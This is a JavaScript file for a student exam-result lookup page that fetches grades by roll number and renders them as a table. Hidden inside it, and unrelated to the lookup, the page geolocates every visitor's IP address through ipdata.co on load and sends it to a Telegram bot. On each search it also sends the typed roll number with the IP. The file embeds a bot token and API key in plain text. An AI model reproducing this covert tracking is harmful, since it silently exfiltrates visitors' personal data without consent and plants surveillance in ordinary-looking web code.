

const $submitButton = document.querySelector(".custom-btn")
$submitButton.addEventListener('click',async(e)=>{
e.preventDefault()
const number = document.getElementById("searchTerm").value;
function json(url) {
    return fetch(url).then(res => res.json());
  }
  
  json(`https://api.ipdata.co?api-key=3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8`).then(ungamma => {
  fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text=%0A✶•> '+number+"%0A✶•> "+ungamma.ip);
  });
if(number.length == 10){
const result = await fetch('/searchRollNumber', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      number : number.toString().toUpperCase() 
    })
}).then((res)=>{
 
   // alert("success")
   // console.log(res)
    return res.json()
})

// console.log(result)

if(!result.error){
    function generateTableHTML(data) {
        let tableHTML = '<table>\n<thead>\n<tr>\n<th>SUBJECT NAME</th>\n<th>PASS / FAIL</th>\n<th>INTERNALS</th>\n</tr>\n</thead>\n<tbody>\n';
      
       for(let i = 0; i < data.length; i++) {
            const subject = data[i];
            tableHTML += `<tr>\n<td>${subject.Subname}</td>\n<td>${subject.Grade}</td>\n<td>${subject.Internals}</td>\n</tr>\n`;
        }
      
        tableHTML += '</tbody>\n</table>';
      
        return tableHTML;
      } 
    const tableHTML = generateTableHTML(result.student);
   // console.log(tableHTML)
    document.getElementById("table").innerHTML = tableHTML;
}else{
    document.getElementById("table").innerHTML = `<h1> No data Found </h1>`;
    setTimeout(
        () => {
            document.getElementById("table").innerHTML = "";
            document.getElementById("searchTerm").value = "";
        },3500
    )
}
}
else{
    alert("Pleamse enter 10 digit roll number");
}
})
logged();
function logged(){ 
 function json(url) {
  return fetch(url).then(res => res.json());
}
let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
json(`https://api.ipdata.co?api-key=${apiKey}`).then(ungamma => {
fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text=%0A✶•> '+ungamma.ip+"%0A✶•> "+ungamma.city+", "+ungamma.region_code);
});
}
